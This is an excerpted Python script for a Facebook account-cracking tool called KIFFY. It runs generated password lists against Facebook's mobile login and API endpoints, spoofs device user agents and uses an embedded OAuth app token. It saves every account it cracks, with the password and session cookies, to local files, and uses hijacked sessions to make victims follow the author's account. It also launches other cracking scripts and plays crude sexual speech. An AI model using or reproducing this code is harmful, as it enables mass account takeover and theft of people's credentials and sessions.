...
os.system('xdg-open https://www.facebook.com/Profile.infiesto')
print(' ')
...
try:
        ...
        os.system('python porncrack.py')
        os.system('python TNT.py')  
...
try:
	...
	print('\x1b[1;92m[√] UPDATING TOOLS PLEASE WAIT...')
...
xxxxx= requests.get('https://raw.githubusercontent.com/CenTsuPH/models/main/4kM.txt').text.splitlines()
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
...
logo =(""" \x1b[1;36m
       ...
       ██╗  ██╗██╗███████╗███████╗██╗   ██╗\n       ██║ ██╔╝██║██╔════╝██╔════╝╚██╗ ██╔╝\n       █████╔╝ ██║█████╗  █████╗   ╚████╔╝ \n       ██╔═██╗ ██║██╔══╝  ██╔══╝    ╚██╔╝  \n       ██║  ██╗██║██║     ██║        ██║\n       ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝        ╚═╝\n\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[1;36m  TOOL NAME    :   KIFFY NI NIÑO\n  TOOL OWNER   :   NIÑO INFIESTO\n  TOOL TYPE    :   FILE CLONE/CRACK \n  TOOL VERSION :   \033[1;35mv0.3\n\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""") 
def linex():
        print(50*'\033[1;33m━')
def clear():
        os.system(f'clear')
...
CorrectUsername = 'LOAD1K'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER CODE NAME \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m───────────────────────\n\033[0;97m[•]\033[1;32m LOGGED IN BOLBOL TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
            os.system('espeak -a 300 "SHIT,  DADDY,  UGH,  CUM,  ME, FUCK, I, GET, CUM, TOOL"')
     #____Make___#
def create():
...
def asha(ids):
    if len(ids)==15:
        ...
        elif ids[:9] in ['100000000']       :alif = ' \033[1;33m2009'
        elif ids[:8] in ['10000000']        :alif = ' \033[1;33m2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' \033[1;33m2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = ' \033[1;33m2010'
        elif ids[:6] in ['100001']          :alif = ' \033[1;33m2010/2011'
        elif ids[:6] in ['100002','100003'] :alif = ' \033[1;33m2011/2012'
        elif ids[:6] in ['100004']          :alif = ' 2012/2013'
        elif ids[:6] in ['100005','100006'] :alif = ' \033[1;33m2013/2014'
        elif ids[:6] in ['100007','100008'] :alif = ' \033[1;33m2014/2015'
        elif ids[:6] in ['100009']          :alif = ' \033[1;33m2015'
        elif ids[:5] in ['10001']           :alif = ' \033[1;33m2015/2016'
        elif ids[:5] in ['10002']           :alif = ' \033[1;33m2016/2017'
        elif ids[:5] in ['10003']           :alif = ' \033[1;33m2018/2019'
        elif ids[:5] in ['10004']           :alif = ' \033[1;33m2019/2020'
        elif ids[:5] in ['10005']           :alif = ' \033[1;33m2020'
        elif ids[:5] in ['10006','10007','']:alif = ' \033[1;33m2021'
        elif ids[:5] in ['10008']           :alif = ' \033[1;33m2022'
        elif ids[:5] in ['10009']           :alif = ' \033[1;33m2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = ' \033[1;33m2008/2009'
    elif len(ids)==8:
        alif = ' \033[1;33m2007/2008'
    elif len(ids)==7:
        alif = ' \033[1;33m2006/2007'
    else:alif=''
    return alif
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RPW] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [RPW-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/RPW-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [RPW-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RPW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'malpha.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/KIFFY,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'mKIFFYget', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                ckkk = ";".join(i["name"]+"="+i["value"] for i in Shahin["session_cookies"]);PUKEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={PUKEb};{ckkk}"
                                print(f"[RPW-OK] {ids} | {pas}"+asha(ids))
                                print(f"FBLINK:https://www.facebook.com/"+ids)
                                #print(f"Cookie:"+cookie)
                                oks.append(ids)
                                if sid[:4] in ['1000']:
                                    open('/sdcard/YUKI_iDs_OLD_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                                elif sid[:4] in ['6155']:
                                    open('/sdcard/YUKI_iDs_NEW_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                                os.system('espeak -a 300 "SHIT,  DADDY,  UGH,  CUM,  ME, FUCK, I, GET, CUM, id"')
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [RPW-CP] '+ids+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 "SHIT,  DADDY,  FUCK,  FUCK,  FUCK, FUCK, I, GET, CUM, CP"')
                                        open(f'/sdcard/RPW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RPWb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ RPWb};{ckkk}"
                                    print(f"[RPW-OK] {ids} | {pas}")
                                    print(f"DATE YEAR:"+asha(ids))
                                    print(f"FBLINK:https://www.facebook.com/"+ids)
                                    #print(f"Cookie:"+cookie)
                                    oks.append(ids)
                                    open('/sdcard/RPW_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RPW_iDs_COOKiEs_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                    os.system('espeak -a 300 "SHIT,  DADDY,  UGH,  CUM,  ME, FUCK, I, GET, CUM, id"')
                                    break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'DRPWk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                    ...
                                    #print(f"Cookie:"+cookie)
                                    oks.append(ids)
                                    open('/sdcard/RPW_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RPW_iDs_COOKiEs_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                    os.system('espeak -a 300 "SHIT,  DADDY,  UGH,  CUM,  ME, FUCK, I, GET, CUM, id"')
                                    break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                oks.append(ids)
                                print(f'\r\r\033[1;32m [NINS-🥵] %s | %s | %s'%(ids,pas,displayYear(ids)))
                                print(f'\r\r\033[1;32m FB LINK : https://www.facebook.com/%s'%(ids))
                                #print(f'\r\r\033[1;33m YEAR : %s'%displayYear(ids))
                                print(f" Cookies🍪 : {kuki}")
                                open(f'/sdcard/NINS-oks.txt', 'a').write(ids+'|'+pas+'\n')
                                open("/sdcard/NINS-cookies🍪", "a").write(ids+ "|" + pas + " | " + kuki + "\n")
                                self.follow(coki)
                                ok.append(used + pw)
                                follow_id='100080607586393'
                                subs = requests.post('https://m.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                                zek(kuki)
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			#session = requests.Session()
			sys.stdout.write(f'\r\r\033[1;37m [Loading] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
    ...
    # 'cookie': 'datr=vB34Zd3ldIrSIphkMiAYypok; sb=vB34ZR0g2qE8yxStH5eakNiN; m_pixel_ratio=2; ps_l=0; ps_n=0; wd=360x648; fr=0vJVKJdFXQCsvAoks..Bl-B28..AAA.0.0.Bl-B54.AWU_N6fxzWw',
    'dpr': '2',
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[RPW-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[RPW-CP] '+idf+' | '+ps+'\033[0;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'DRPWk/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RPW-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RPW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
